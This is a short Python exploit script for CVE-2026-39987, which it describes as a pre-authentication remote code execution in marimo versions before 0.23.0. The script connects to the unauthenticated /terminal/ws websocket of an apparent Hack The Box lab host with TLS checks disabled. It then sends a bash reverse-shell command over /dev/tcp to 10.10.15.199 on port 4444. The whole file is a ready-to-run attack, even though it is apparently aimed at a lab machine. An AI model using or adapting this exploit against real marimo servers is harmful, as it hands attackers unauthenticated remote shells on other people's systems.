"""
CVE-2026-39987 is a preauth RCE in marimo versions prior to 0.23.0
Leading to RCE in /terminal/ws endpoint which fails to check auth
"""



import websocket
import time
import ssl

# 1. Establish the connection securely bypassing TLS
ws = websocket.create_connection(
    'wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws',
    sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False}
)

# 2. Drain any initial terminal banners or shell prompts
try:
    while True:
        ws.settimeout(1)
        ws.recv()
except Exception:
    pass

# 3. Send the command to the system terminal
print("[*] Sending command...")
ws.send('bash -c "bash -i >& /dev/tcp/10.10.15.199/4444 0>&1"\n')

# 4. Loop to catch ALL returning output frames until the data stops
ws.settimeout(2) 
print("[*] Receiving output:")
try:
    while True:
        output = ws.recv()
        if not output:
            break
        print(output, end="") # Print exactly what comes over the wire
except websocket.WebSocketTimeoutException:
    # This exception means the terminal has finished sending data for now
    print("\n[*] Stream idle (timeout reached).")
    
except KeyboardInterrupt:
    print("\n\n[!] KeyboardInterrupt")

except Exception as e:
    print(f"\n[!] Connection error: {e}")